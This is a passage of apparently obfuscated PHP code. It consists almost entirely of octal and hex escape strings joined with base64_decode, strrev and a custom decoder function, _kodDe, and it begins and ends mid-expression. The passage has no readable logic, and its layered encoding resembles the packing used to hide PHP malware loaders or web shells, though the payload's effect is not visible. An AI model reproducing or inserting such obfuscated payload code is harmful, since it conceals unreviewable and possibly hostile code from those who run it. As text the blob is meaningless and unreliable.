4\260\111\262\251\131\162\161\66\151\336\327\31\360\64\373\44\177\107\44\110\65\262".base64_decode('md4d0sUPszgFgW4ozOCY1McR0V5AbJG1RDB0iaM8WhadGq2IVi5zRY2lbnFKyA==')."\76\330\351\45\103\252\147\41\266\171\266\207\303\13\210\231\111\60\344\151\16\320\317\3\22\107\202\301\146\77\16\154\273\370\336\217\377\164\376\266\53\356\332\162\316\32"._kodDe('LsDAu8bPP9lqDzOiL+tWt5rMps5lt6bPv+FqS80rv+R962n/zexvA8gey1WuTbs=')."\x7f\xd8\x7a\xc9\x1f\xb7\x5d\x7e\x6\xce\xf8\xe4\xd6\x7b\xb7\x9c\x7b\xb\xeb\x98\xf4\xc9\x45\x8f\x6f\x3d\x7f\xfd\xd6\x75\xf7\x6c\x5d\x73\xd7\x96\x3f\x5d\xb4\xe5\xcf\xa7\x6f\x79\xe4\x11"."\x7\xa8\xfd\xc9\x99\x6b\xb6\x3d\x76\xd7\xd6\xdf\x5d\xb2\xf5\x86\x53\xb7\x3e\xb8\x7a\xeb\x95\x6b\xb6\x9c\x7b\xdd\x96\xcb\x6e\xd9\x76\xfe\xdd\x5b\xae\x5f\xb5\xe5\xac\x35\xdb\xef\x5e\x37"."\311\216\74\70\276\204\202\237\150\25\270\117\212\32\123\53\60\110\243\106\25\4\147\45\370\255\200\112\335\340\227\352\257\2\224\13\103\343\257\216\146\237\335\110\102\214"."\22\13\355\251\30\53\40\122\63\356\313\40\26\336\64\36\103\166\61\345\143\366\142\5\231\163\241\123\102\147\274\276\160\163\310\337\344\43\152\303\154\242\246\40\215\324".base64_decode('KaQ3CwLh0EIWZpZCRXb1UgVF4ErJMhDZldAyhWwOdVYqg/pCZQ5I0xHjJZXBPQ==')."\x9\x24\x28\x9\xb0\xdc\x2a\xa0\xc1\x2d\x52\x75\x2c\xef\x29\x77\x54\x3b\xa6\x55\x4a\xc4\xe8\x1e\xd7\x20\x46\xf6\x52\x19\x51\x64\x65\xf5\x2c\x1f\x71\xc4\x2d\xb1\x69\x8e\xea\x4a\xa9\x2c"."\337\137\106\372\305\341\12\172\37\303\45\15\111\166\124\220\16\213\335\345\145\1\101\64\114\135\126\301\56\55\45\34\54\211\325\7\277\26\303\371\204\213\327\300\363\4".base64_decode('StjTJE+H11oS29t3lktyLglyMHzFaS6vlOJEGbtEJqpmAUajBRgVVYQ2dLay+Q==')."\xc6\xfa\xd3\x12\x36\xc4\xc1\xdd\x92\xd\x3a\x51\x24\x15\x4d\x15\x4c\xc5\xb3\x45\xcb\x6a\x60\x18\x60\x72\x70\x79\x10\x60\x39\xfd\xca\x8\x6f\x9\x90\x20\x96\x41\x67\x10\xa6\xb3\x49\x2c"."\x91\x87\x1c\x21\x94\x61\x9e\xe\x8f\x33\x6b\xa4\x28\x79\x23\x96\xf8\xed\x3d\x6c\xc\x14\x97\x25\xba\xf3\x33\x37\xa\xd0\xa4\xc8\x17\x69\x6e\xc3\x58\x1e\x16\xd0\x3c\x19\x9f\x62\x41\x54"."\16\116\311\202\42\31\152\23\113\312\341\345\2\11\302\176\250\234\277\243\45\30\152\307\246\64\341\346\66\137\273\307\105\10\67\306\4\134\36\162\56\122\243\124\16\51".base64_decode('H04qt4AffYiCLIK+CtZVzAQ8CoZCPkU6Q2ZfQvaUMqrSWI4NlUmTzOtHMBSJAQ==')."\x0\x10\xf2\x2c\x50\xdd\x72\x61\x87\x10\xb4\x6c\xa1\x45\xc8\x20\xe3\xdb\xe5\x4\x10\x46\xa9\x1d\x7e\x9c\x3a\x7\x1\x8d\xc3\x36\x9b\x83\x1d\x2d\x7e\x6a\x35\xe4\x8d\x5b\xf2\xbc\x21\x3f".strrev('m9 3X;|:tvPss$"z1h%4')."\366\262\160\33\63\350\203\31\301\220\20\361\204\74\355\141\26\15\165\3\132\15\323\4\303\266\166\117\70\2\106\325\321\325\316\351\171\300\263\20\240\102\220\263\34\224"."\x16\x57\xb8\xa6\xce\xab\x8c\x62\xb3\x1d\x1c\xc4\x3f\x27\xd0\x18\x34\x77\x58\xba\x7c\x9a\x43\x9a\xb1\xb2\x92\x94\xa1\x86\x2e\x31\x33\xd\xd8\xf6\x18\xff\xca\x82\x40\x2c\x10\x6c\xc5\x71"."\xe4\x3b\xc5\x97\x4b\x72\xde\x5d\x5a\x22\x1\x26\x34\xc2\x99\x50\x83\x6e\x4c\xc\xd7\x25\x80\xa1\x12\xb6\x5\x94\x3a\x82\xdd\x1e\xee\x88\x43\xc8\xc0\x29\xc4\x4\x51\xe2\xee\x39\xdc\x27"."\x2d\x89\xe\x45\x5d\x80\xb\x30\x96\x71\x6b\x1c\x6f\x93\x44\xf9\x8b\x66\x28\x79\x10\xd3\x10\x52\xdb\x43\xf7\xca\x65\xe\xb2\x2d\xc4\x32\x5a\x8a\xf1\x78\x1d\x5e\xca\x13\xe0\xdf\x45\x34"."\200\10\42\251\0\244\317\174\206\232\345\140\173\240\130\164\105\364\370\250\323\205\115\240\40\127\22\165\360\56\305\174\213\300\106\32\16\133\354\267\142\310\307\4\151\35"."\14\226\204\360\322\304\221\71\344\207\10\54\163\10\10\110\164\156\43\233\123\337\202\25\35\340\157\153\144\205\17\374\15\200\237\100\4\314\232\312\12\200\165\27\360\317".base64_decode('962A//CMSgZIbC1hreDvWAH+BVRkhb/D3liTL9Lt8+ECNEx+eVFAVchQBRc7Jw==')."\6\251\371\236\24\360\265\104\44\30\247\335\210\305\52\20\60\235\113\253\52\143\61\267\321\105\320\206\231\110\127\224\117\236\126\116\66\12\117\270\231\223\130\13\102\24".base64_decode('4wJSCbciAnMZQ+KtoWBXpxBv8yz0d7TSmHsqDU2lPiy8/jAAUTNFRu7JRowTrg==')."\22\361\76\42\73\153\301\154\57\40\337\40\42\360\342\220\313\307\344\327\272\330\232\272\374\1\257\150\262\12\13\222\135\3\221\156\262\161\114\241\235\243\161\144\274\112".base64_decode('IxDkNIzQjUYQDGgEA4DGELhoBHnMoRE0UBqBYoevg+YBuQ7IZFRYS3FN4bQ8yA==').base64_decode('zK8aknHBihpSYhd2dgIN6oFMKLPTPdshHTo8EqRqrP0nCVag8LRPOO9x4xKA2Q==')."\104\145\300\157\164\331\74\304\14\57\243\50\213\55\17\315\210\152\146\54\37\45\306\112\340\243\176\144\354\45\174\226\154\347\374\200\10\53\335\306\64\301\132\1\33\71"."\221\203\107\176\44\143\225\212\30\105\132\306\204\35\142\255\355\40\277\72\37\226\125\207\22\246\20\74\370\5\376\211\222\262\364\164\200\130\141\225\73\310\6\353\17\306"."\2\140\333\210\211\62\243\77\110\216\24\134\161\321\334\67\306\255\206\135\62\327\144\64\365\202\340\202\7\151\65\202\151\364\160\343\100\166\312\201\362\12\161\130\130\200"."\x9b\xaa\xd5\xc3\x53\x32\x98\x8a\x57\x26\x61\x9e\x60\x22\x35\x12\xc6\xae\x89\xec\x2a\x87\x62\x32\xd7\x5a\x64\x27\xd5\x54\x59\x52\x5\x20\xb7\x54\x10\x4f\x6b\xe5\xa4\xa0\xa2\x28\xd1\x2f"."\xa3\x53\xc5\x9c\xd5\x7f\xe\x40\x89\x4c\xc\x1a\xd4\x2\x86\x27\xa6\xf0\xfe\x67\x15\xc3\x60\x7\xe2\x88\x1\xa0\x41\x33\xcd\xad\x19\x45\x37\x41\xde\x26\xa\xab\x42\xce\xc\x2b\x19\xe2".strrev('IͼW;bxZHd7@"ܞG¼')."\125\363\366\263\254\234\326\251\350\131\25\35\313\165\163\225\156\226\57\324\106\232\363\332\317\1\267\220\3\137\350\144\63\353\244\27\313\314\373\33\102\30\211\261\152\114"."\x4f\x19\x4c\x29\xaa\x2b\xa8\xd6\x22\xaa\x41\x9a\xd5\x33\x18\xa7\x26\xd9\x3a\x67\x6a\x5a\xbb\x9c\x1b\x89\x68\xb\x55\x85\xa0\xa9\x37\xd8\xdd\x11\x8\x52\x3f\x27\xd4\x9\x12\x21\x59\xa3"."\x4\xef\x1\xf2\xb9\x68\xc4\xa4\x1\x5d\x26\x5f\xee\xa6\x5b\x1a\x3c\x67\x12\x3c\xe2\x4d\x12\x71\x0\x4d\x26\xc7\x49\x4f\xa8\xb9\xd\x30\xa3\xb1\x16\x3f\xe0\xc1\x7d\x8b\x22\xbc\x81\x36"."\120\25\260\267\355\324\332\37\120\121\110\256\2\132\212\55\123\100\216\210\227\13\313\122\365\7\111\135\227\2\225\317\261\112\62\64\26\140\25\261\77\207\377\136\251\113".base64_decode('8BQ1xiosWa+ZFGQf1JHo8N8/GFI4Qw2qIV3//1qJ+yxDX0KVBAplq4NQBetOkw==')."\131\115\223\154\156\236\17\310\42\220\24\332\300\356\31\14\365\220\341\33\21\13\245\303\147\202\156\144\61\104\170\201\6\164\304\355\104\300\41\374\305\162\100\336\130\210"."\336\131\341\155\100\64\143\43\16\44\370\361\267\7\377\364\144\223\116\320\171\162\73\225\124\114\146\270\17\327\224\107\160\53\40\130\140\145\31\71\32\22\234\352\310\203"."\12\124\357\247\54\170\121\27\10\20\370\0\51\130\230\341\74\334\214\271\327\224\371\101\157\54\34\354\12\321\23\73\30\107\126\134\41\137\163\17\73\110\143\251\55\236"."\205\366\24\210\361\21\117\153\311\144\46\55\301\164\304\217\304\102\101\50\64\372\2\55\266\12\341\66\346\337\310\232\26\13\370\73\346\227\314\210\4\143\355\102\25\234".base64_decode('6I/42u1p1hbCPrhaebwpEGwWsv3BYkgAJsiWiGVPnAiY6OhyxHnUAwYkuQKyrQ==')."\316\30\340\172\347\105\127\126\126\104\335\363\134\123\231\320\205\251\207\140\200\64\106\262\101\251\74\334\17\50\356\341\122\44\346\166\271\110\233\54\0\244\100\346\34\202"."\322\110\342\103\56\214\315\350\55\37\265\31\320\122\133\76\227\335\345\222\37\37\223\307\302\75\141\6\134\214\171\245\362\55\350\204\213\211\67\131\266\302\340\157\247\130"."\x34\xa2\x64\xf3\x25\xb\x5a\xf0\xd1\x62\xb5\x25\x26\xb9\x54\x8d\xa3\x3e\x5f\xb5\x49\x2d\x51\x80\x96\xfa\x1c\xc0\x7c\xf\x1\x49\x2e\xbe\x7f\xd2\x65\xc6\x8e\x3\xc8\xe\xe2\x14\xbd\xed"."\101\230\212\254\100\62\156\333\16\110\2\277\26\23\66\15\236\130\103\257\327\173\234\131\147\62\32\151\205\276\203\242\213\131\7\125\135\160\336\223\320\162\111\125\260\30".strrev('igHiI9SPӀb-.FLl̘ HsY$/t')."\252\334\157\311\347\216\244\362\132\106\245\376\74\6\234\340\23\102\36\56\14\32\247\264\36\336\317\60\237\133\60\142\260\230\210\27\210\22\122\316\224\333\13\13\354\115"."\30\165\271\136\252\45\356\355\132\0\343\45\30\271\120\207\145\334\122\24\156\335\310\243\33\216\72\44\356\54\223\212\222\245\371\12\50\266\10\126\73\224\42\144\373\371"._kodDe('MFmLjaQfyxoTEql+ynJIWon/rL0ADoJXnUxyAQKJCf+UgaYfA75NQVrcYtfXxfw=')."\72\333\332\75\315\116\100\327\152\352\146\260\335\45\32\1\333\13\305\34\171\310\250\245\54\56\116\251\232\41\245\1\250\11\112\24\173\324\232\154\165\41\207\23\261\103"."\50\40\144\45\341\135\34\235\4\234\152\103\25\234\310\331\161\34\307\216\106\350\305\166\132\146\35\206\303\300\241\122\337\135\124\362\273\213\112\175\167\221\355\273\213\212".strrev('^Co+$ \\i8,oi/kB1	I,;He)(l')."\x61\x41\x58\x9a\x73\x11\x42\x94\xa4\xe4\xdc\xa0\xe4\x3c\x23\x1b\x26\x64\x72\xff\x2f\xfc\xbe\x41\x3\xf1\x76\xc6\x79\x33\x26\xca\xad\x19\x86\x1b\xfa\xb8\x41\xac\x23\xbb\x1a\xf\x86\xe9".strrev('Eל7@XJR{p1ᘽPs LuQ').strrev('FSm6`0-fs'."\0".':&uPԐ˟x\'f%ϐT')."\340\206\231\34\332\311\374\261\331\207\243\132\154\357\71\375\323\271\333\76\164\126\356\54\231\340\24\314\147\61\135\20\34\72\202\36\222\217\300\16\223\225\234\106\120\242"."\122\54\376\131\134\152\374\116\235\73\317\3\263\212\135\255\316\127\106\250\33\72\333\132\260\171\256\213\266\106\333\243\21\21\140\246\56\367\366\202\156\13\316\260\54\175"."\371\71\337\172\344\30\350\370\222\336\364\110\46\142\164\335\72\322\140\161\14\305\30\236\42\347\312\45\60\165\1\114\47\270\332\313\325\136\362\5\301\313\267\210\35\160"."\x57\x66\x3e\x99\xa1\xd4\x8a\x5d\x1a\x52\x2\x81\x5c\xd\x12\x9f\xa4\xcc\xf7\x1f\x0\x4f\xae\x49\x4b\x92\x2d\x6e\x79\x19\xc0\xbb\xb2\xfa\xb2\xc9\x15\xe0\xb7\xb2\xcc\x51\x6\x19\x24\x14"."\x87\x33\x5\x13\x50\x3f\xca\xea\x27\x57\xa0\x40\x25\xb1\x23\x1f\x25\x2a\x89\x82\x6f\x2f\x7e\x3\x41\xe4\xd5\x79\xb2\x69\xa\x7\x66\xf3\x10\x34\xe0\x4a\xaf\x71\xd7\xb8\x87\xc8\xea\x9f"."\67\0\277\310\235\12\333\51\376\160\14\20\71\252\335\23\23\111\55\41\342\4\352\142\116\33\353\11\45\302\355\336\72\112\63\75\355\213\235\334\333\336\234\171\303\331".base64_decode('jESEm8byaa7qcon6pG4s74q0OGeVz5u7/5xmdJJuKu3wKBx6MsRy51xy3jUHLg==')."\46\26\161\133\143\143\325\45\64\51\53\217\152\71\260\261\1\172\224\165\45\10\60\273\30\315\342\16\20\163\212\71\244\351\344\232\200\220\323\32\252\363\231\26\50\115"."\326\40\153\14\233\267\327\303\3\60\72\374\256\374\110\41\347\204\322\257\63\54\272\232\261\171\132\255\266\226\207\362\253\265\274\110\10\23\234\104\144\171\20\173\306\255"."\227\104\167\311\202\173\71\47\344\0\360\312\243\207\46\44\15\322\110\232\244\212\316\372\50\136\103\2\30\263\22\300\23\154\375\205\240\166\2\256\12\342\77\130\124\140".base64_decode('szWVUkWsPnntnnrtUEBV4OQ6RRfAw4CBhtnQh6gTzq9TTY6Vwxd1ya4mCKqUKg==').base64_decode('0lVQk/ZPopsZZ6FAP1iyUZG9pwXQIPysPQujDeRwJ+Ot7by6cDBZ7IUTLF6pZg==').base64_decode('en3dbPCHkEd6sVTIm40sSL10TnL3UjrAHfjSscEJt7gmFZI5GNkKpwTEUo731g==').base64_decode('4v6ZDBTLjYJDVnSCilcSvGmNMX+2JShpUhmkuyXZLAVVQTYhKRrQWXmZL5F4pg==').base64_decode('n48kDnXZCIb3g45qnKlC26pwXJlIF3L9jUKmZGqalJVzI4Tdn2LUTzEa4Icapw==')."\270\152\173\15\20\41\364\232\371\51\203\373\10\167\62\204\335\23\220\34\174\136\354\202\156\243\135\160\223\12\121\35\373\316\114\201\71\12\316\243\60\351\141\147\240\253".strrev('-Lch%%6j9W'."\n".'\'2YGof	\\!')."\75\101\275\265\225\271\11\35\105\5\270\200\64\107\45\125\312\141\25\251\27\240\211\23\205\160\166\371\334\71\156\165\56\3\66\367\274\240\153\134\325\325\345\76\16\212"."\x4b\x6e\x78\xef\x9a\x3b\x1e\xce\xae\x78\xf7\x83\x52\x5b\xb8\x9f\x5\x49\x9a\x23\x4b\x18\x8e\x8d\xe5\xf0\x52\xac\xb7\x5c\x4a\x83\xfd\x98\x69\x96\xcc\xb5\x57\xee\xa0\x17\x10\x73\xdc\xb2"."\230\11\127\126\110\243\314\56\23\231\6\331\111\160\311\43\156\117\302\346\362\267\131\316\55\54\256\2\33\167\45\112\145\271\221\14\357\26\334\115\23\137\57\242\32\240"."\305\15\222\365\374\237\35\231\227\100\20\27\163\262\237\227\23\375\20\273\370\126\200\13\272\110\106\47\24\116\160\206\305\151\255\51\334\164\201\41\200\217\102\341\124\347"."\x4e\xb8\x97\x2f\xc7\xd\xc1\xdd\x7f\xe5\xca\xe2\x34\xa2\x2b\x63\xcf\xf2\xe4\x55\x7b\x12\xc4\x22\x7b\x1a\x94\xaf\x79\x1a\xd8\xd3\xac\x9f\xc1\x18\x2c\x16\xe2\x29\xb4\x4c\xa0\xa3\x95\x57"."\300\302\7\217\203\314\45\124\15\15\305\242\113\312\135\123\127\256\164\253\364\162\71\132\146\255\353\142\245\161\74\352\262\226\7\75\47\240\146\5\111\202\275\44\346\35"."\x4f\x24\xb\x6f\x7f\xf7\x54\xae\x42\xcf\x2e\x91\x25\x78\xb3\xdc\xd8\x38\x77\x9\xbb\x34\x58\x4a\xf3\x28\x3\xa8\x4e\x9b\x45\xa7\x7b\x34\xed\x8c\x74\xb3\x60\x73\x7\x67\x71\x19\x82\x63".strrev('E?JٻFw!{Ҍ^|ÊרG̃yBZ')._kodDe('LguzS1BE9jcKc7kAcH7yv5v+jlLKHHm3INg4zlrApOwYPPbiCc3a/xeouok4DzQ=')."\227\50\103\76\114\313\0\115\302\71\204\30\360\256\314\201\304\107\322\225\114\143\31\352\256\221\126\24\120\37\221\227\122\37\1\25\313\44\112\31\263\62\203\230\156\152".strrev('_ԍtQKX!z'."\n".'">N	;aU:z(W~c`').strrev('[d=c!z2p=}\\RlKl0P')."\x16\xbe\x9a\x9\xa7\xb\x26\xdf\xec\xa0\x8b\xd3\x8\xb4\xaf\x31\x48\xb2\xe0\x1\x9\xfa\x5f\x52\x92\xf4\xb0\x42\x61\xbe\xb8\x48\x7a\x89\x1a\xf8\xae\x4\xb6\x47\x97\x83\xe5\xa0\x2\x7f"."\51\243\121\27\120\65\325\325\325\316\352\151\340\17\273\52\44\237\250\257\256\56\52\122\135\135\217\376\340\14\164\230\112\0\152\315\1\353\227\22\32\122\140\10\210\377".strrev(';ĊH5 @OTdL'."\0".''."\0".':'."\0".'9H{ND$')."\37\272\123\300\145\117\303\200\55\1\163\205\300\102\301\114\65\22\100\61\216\5\240\37\276\134\222\310\33\15\330\266\244\121\374\230\213\202\127\114\24\157\214\54\137\5".strrev('CD`"Pb0la(Jb	`f')."\203\207\162\11\105\31\66\114\2\1\112\376\50\212\320\333\144\162\71\215\254\303\372\325\214\305\164\50\46\264\55\172\367\5\124\6\162\257\164\376\360\361\70\371\0\144"."\x7c\x5c\x7c\xea\x91\xfb\x43\xf4\xbc\xc\xd6\x57\xa9\xdf\x5f\x0\x9e\xae\x71\x63\x9e\xa2\xb7\x98\x68\x4c\x30\x2c\xa3\x87\xc7\xe1\xff\xa2\x10\x41\x53\x7c\x34\x1\xab\x10\x34\x33\xbf\x4f".base64_decode('QgP2LFsdT1J4JsjgDp+amW830QsUvogVLuYN4nyU37zSNtgwgYTgyutaCoDcEA==').strrev('s3FB9z(7(--CXPbK%\'K;'."\n".'')."\56\46\102\211\103\274\153\107\366\205\326\66\240\50\143\115\141\75\373\31\134\241\42\250\111\136\67\22\14\254\110\61\256\206\4\217\7\304\43\113\125\243\327\370\20\32"."\xfc\x7e\xcd\x9a\x5e\x84\x65\x64\x29\x50\xca\x87\xd7\x8a\x35\x6f\xf3\x59\x6b\x69\xe0\x22\x5a\xa\xe\x9e\x9d\x44\x89\x7\xb2\x70\xe0\x31\x51\xca\x86\xcb\xa5\x8d\xbd\xc4\x53\x2\x5d\xac".strrev('$'."\r".'4SLZk`JNL1OrD"P64Q(')."\xa\x18\x10\xf7\xce\x8\xae\xe2\x9c\xcb\xbf\x63\xb9\xbf\x11\x9c\x2a\xb2\xa2\x80\x68\xd3\xaf\xcb\x94\x5a\x23\xfd\x17\x17\xf2\xf9\xca\x99\x7b\x5b\xd4\xae\x23\x83\xa8\xb3\x49\xe9\x2f\xf5"."\106\231\143\116\363\341\164\206\5\65\206\22\137\40\225\130\25\262\151\350\112\2\110\63\220\360\161\304\112\344\314\220\222\22\243\1\215\111\272\360\276\100\51\321\4\64"."\x34\x16\x90\x13\x62\x1\x90\xc1\xa\xa2\x11\xb3\xe0\xcc\x12\xc4\x4\xf\xa4\xc2\x4e\xee\x9c\x26\x31\x16\x20\x86\x5b\xc6\x91\x2a\x21\x3\x95\x2f\xc5\xd\xd8\xce\x5b\x4\xad\x44\x24\x62"."\x86\xb\x71\x76\xb4\x6d\xdb\xa1\xa9\xce\xa3\x24\xee\x92\x54\x73\x11\x36\x80\x8c\x70\xe1\x8\xc\x31\xf\x34\xb\xdd\xe7\xf1\x91\x89\x55\xd0\x37\x8b\xaa\xe0\x3c\xb8\xb3\x71\x15\x47\x31"."\307\0\162\11\4\325\330\71\45\76\205\262\4\210\46\350\306\113\56\320\172\70\220\110\306\210\102\325\240\234\323\152\234\324\237\205\250\375\110\266\106\2\137\310\107\12"."\x68\x0\xb9\x5d\x4a\xc1\x88\xa6\x13\x29\xc7\xcb\x68\xc2\xc3\x3c\xc8\x0\x96\x5b\xfd\x21\x8b\x5e\x36\x9f\xc8\xf4\x97\xc5\x74\x61\xc7\x51\x98\x16\x14\x32\xa3\x15\xc9\xa\xbf\xc4\xc5\xca".strrev('+TU碴lXI^\'a'."\n".'ىh!|W@Q')."\44\15\373\76\25\0\303\57\243\261\335\60\325\24\144\164\211\47\107\64\226\130\174\241\355\142\232\222\304\36\204\274\200\123\121\11\355\101\54\147\11\355\43\114\257\37"."\314\144\77\334\37\231\22\233\41\106\150\56\103\116\303\22\301\32\40\226\332\54\211\225\32\122\210\151\7\223\201\73\333\72\335\54\251\211\202\211\131\150\22\1\212\277"."\251\102\124\241\210\155\305\20\200\273\66\104\26\130\163\75\123\212\241\57\66\16\145\325\204\24\10\266\372\233\75\1\257\77\74\137\112\51\246\360\334\50\122\156\266\56"."\167\164\44\204\47\207\142\176\234\71\333\205\101\147\34\260\205\316\44\143\207\15\316\370\12\272\62\202\347\171\153\263\30\107\25\275\250\105\300\106\147\255\4\1\325\201".base64_decode('B10lSmf4WY9QOK8rxeVHFPTsIu+xUKFQojekfOkvgCViLQ02ayU3VufV3KBqqA==')."\234\70\320\32\43\142\353\374\50\117\147\56\242\5\240\47\105\57\320\34\330\370\53\242\131\277\135\366\24\113\210\52\220\170\232\104\217\36\171\172\60\115\236\22\341\376".base64_decode('uVFU8Jye12XVUIQE7MJ7aiWNCd4/SO0YroPTQvAZwv9142qSe/KwdU1N0utspg==').strrev('kuu'."\0".']['."\n".'N&d⎯w.С6')."\x5c\x42\x1f\xc9\x8b\xb7\x23\xee\x24\x7d\x88\x87\x4a\x6e\xd0\x31\x89\x8f\x1e\x8d\xc2\x88\xf0\x8c\x89\x96\x4c\x64\xb4\x42\x92\x57\x26\x1f\x83\xbd\xc1\x2\xc\x10\xa7\xe0\xa5\x1\x65\x74".base64_decode('XZT8mRKZFctdoc0jvl0VzvI0YdE3oKvhsdsB9SQuxbMCUqNUjU6KuNKTNIfa2g==').base64_decode('8E8gJwi+bN60yGhEJRYnIV6EyzFQ00LLjhQlWAT8AO0G072CHphzvZo4akQOwQ==')."\256\202\337\343\200\52\310\70\204\205\100\7\140\313\25\263\330\13\74\156\147\314\106\15\373\206\302\231\33\100\42\302\151\155\310\372\136\7\114\21\130\31\13\211\266\176".strrev('˗'."\n".'	#/-l+^44(օ-s,').base64_decode('UC147S3nGBEj/u/Zuxx8sdE8AYPQCxDeMarakiWrQ27u55zvR1bf1OyiiylBIQ==')."\145\64\321\323\170\104\213\310\51\7\346\204\40\75\342\261\246\21\61\54\152\371\241\101\203\114\172\102\222\144\30\60\127\50\100\237\320\110\72\320\373\16\230\52\331\337"."\20\21\226\13\43\165\142\355\124\106\213\313\231\20\326\236\261\150\237\353\100\212\141\272\161\226\142\204\120\311\371\374\230\207\361\204\73\301\7\363\205\234\37\333\57\131"."\122\165\101\112\22\365\54\361\25\4\67\335\40\305\301\327\72\361\235\3\31\266\330\44\275\367\101\77\120\216\152\21\336\343\163\27\337\23\101\355\36\312\354\10\152\160"."\344\372\316\45\212\61\244\200\64\107\342\23\154\131\240\20\41\340\252\107\1\264\352\105\266\367\147\122\31\36\132\137\231\301\10\213\176\274\112\57\223\1\140\134\160\154"."\43\30\160\362\273\142\373\313\26\364\63\354\231\16\7\36\31\177\51\11\77\312\341\140\17\160\70\360\333\33\16\362\354\206\203\233\340\374\334\103\65\374\231\55\353\333".base64_decode('XLDPTG+siBm38+EMVLYKITvgIlrxuRq/HcsVsvxCEkSscknRgIURFvSMA90NOg==')."\250\277\22\33\70\370\250\304\231\51\1\303\377\336\6\126\37\104\302\106\322\112\165\352\347\304\165\172\337\142\57\246\132\260\16\210\370\134\133\35\73\164\52\362\366\337".base64_decode('k03WTK+bLQr1fH74PQZxI0cca5HLFLKB84mXrGglUWdS4vJFmVYFz+JncgQUtQ==')."\222\344\377\335\122\340\54\62\56\52\50\136\26\277\1\126\4\22\204\225\202\222\202\260\241\331\156\241\65\170\71\154\360\316\342\55\214\77\223\143\375\26\176\324\251\304"."\70\204\215\210\57\15\374\2\213\226\201\302\146\26\36\165\232\272\154\225\232\112\11\7\10\22\124\22\121\321\43\162\212\275\357\10\60\344\130\201\147\13\322\203\330\242"."\xa9\xd9\xcf\x44\x60\x75\xb8\x51\xa1\x23\xb9\x60\x2e\x43\xb6\x5d\x68\x6b\xc8\x17\xd9\xff\xdd\x4\x52\x1\x1\xcb\x18\x5c\x1f\xa1\xc4\xc8\xdd\x27\x50\x42\x62\x7b\xc1\xc6\xf6\x4\xd9\xcf"."\xf4\x1b\x33\x5d\x4c\x18\x72\xca\xf4\x55\x1c\x34\xa9\xc2\x39\x9a\x62\x6\xd1\x4\x13\xee\x85\xcb\x66\xd6\xb1\xda\x9a\x7\xd5\x78\x1b\x4b\x1d\xd2\x58\x85\x8a\xb9\x30\xe1\xc5\x1e\xee\x7c".strrev('=%!-:4PeĆ&pV-ViYKh4jm``A')."\352\216\24\67\74\255\314\334\107\26\324\105\40\350\204\127\250\64\61\154\265\234\15\122\367\126\200\111\262\210\135\40\356\265\75\124\206\210\217\375\365\62\72\176\264\316"."\x39\x4d\x13\xec\xc6\x2c\xdc\x3f\x7b\xae\xc3\x22\xd\x18\xf6\x77\x6b\x0\x3b\x25\xfa\xa8\x3\x51\x86\xe1\x64\xf3\x24\x54\xf\x69\xe2\xe2\xaf\x39\xec\x6f\xd7\xe5\x5\x23\x59\xdb\x3\x97"."\302\301\245\365\351\312\264\330\55\350\46\300\266\254\251\341\36\264\203\304\267\51\204\360\43\347\141\70\114\71\361\377\347\267\354\376\177\76\141\307\224\301\133\11\133\113"."\171\260\121\301\325\46\76\324\264\365\336\272\61\356\47\346\22\274\164\130\142\44\302\227\31\334\161\134\266\267\73\135\114\41\221\72\223\240\76\46\144\172\151\42\303\367"."\172\212\16\51\351\73\127\0\17\373\331\63\114\245\42\305\217\20\132\120\216\162\231\274\233\71\65\321\137\342\22\16\2\76\140\365\242\47\360\6\105\305\70\125\2\54"."\4\165\237\341\246\241\4\24\256\40\3\111\211\241\150\34\26\314\123\61\254\222\320\337\245\47\120\242\201\54\114\11\355\20\351\205\45\251\210\312\104\54\173\237\45\121"."\x4\xf\x7f\x6c\xd3\x65\x7d\x3b\x92\xd4\x68\xb7\xbd\x32\x84\xb\x59\x5c\x3f\x5a\x4e\x94\x8b\xef\x64\x8b\x6b\xb3\x25\x2c\x56\x81\xa\x9a\xd6\x73\x19\xf6\x60\x61\xb5\xfd\x5\xc3\x69\xce"."\342\217\141\375\150\170\212\20\202\162\76\105\110\164\351\200\56\5\113\324\301\213\61\314\313\214\201\376\245\227\36\173\156\122\20\177\101\110\34\57\135\302\235\272\206\30"."\60\153\52\73\313\20\364\341\204\327\363\212\136\364\262\35\336\3\241\210\337\146\251\32\362\322\111\206\35\356\152\257\100\52\376\4\123\1\117\57\274\122\153\146\363\370".strrev(']ɠZf>U/K'."\r".'BX[Jce@f]FծXt')."\332\135\246\42\1\30\313\264\26\321\226\134\35\212\111\302\315\32\140\152\223\126\255\110\224\211\222\251\113\46\372\164\61\277\33\262\136\315\61\77\221\105\224\252\240\6"."\204\154\124\213\72\365\0\277\320\242\310\317\355\247\121\66\76\321\366\14\312\46\275\340\262\327\352\262\110\20\302\105\136\2\341\216\257\370\256\206\137\41\11\133\76\255".base64_decode('BkUQTmtt6QLx59ROHuTXM5znTSbZO5iWoknK9bNUkMKfzIQcjmCkyLVhlSH70w==')."\154\56\321\260\321\122\260\70\225\33\61\332\307\205\326\202\305\47\255\113\264\176\144\330\302\223\260\173\134\246\165\42\10\16\120\135\233\253\243\340\76\62\261\230\177\322"."\152\153\311\212\261\311\0\145\220\162\274\323\222\152\23\205\340\41\3\335\237\155\131\206\370\166\247\365\342\115\224\323\205\271\125\62\1\241\71\361\122\156\314\12\341\322".base64_decode('H+HoZgWxYJfKM+gupFmAL1AxNjBSMiRmWrpjn1rExXO8xIlZdI7poufCxeUVWw==')."\xef\xc5\xa\xf6\x91\xe1\x1a\xc6\x90\x6a\x26\xd2\xc5\xe9\x7a\x11\xdc\x48\x5b\xa5\xbb\x64\xff\x30\x5\x9b\x5d\xa6\xe2\x8d\x8\xd2\x4c\xd1\xe5\x7d\x44\x2b\x51\x7\xf7\xa8\x64\x35\x9c\x85"."\36\221\146\374\237\245\56\36\145\311\272\70\13\326\55\312\246\225\205\303\10\241\236\51\27\214\61\206\127\14\74\42\227\47\113\14\330\46\275\342\242\143\301\263\144\341".base64_decode('4s8RpLKXRoJ86V5w+dt2QVqqFyULj9mLEg/jEt9UJegkzSlBGfltejEN5nkl7g==').base64_decode('9nGbcH8VHaSUyBYVBUqrEoRKrm7DesdvSxcBw1WEiNJQf44aWoDqXO0KalWyFw==').strrev('?Oq"T'."\n".'E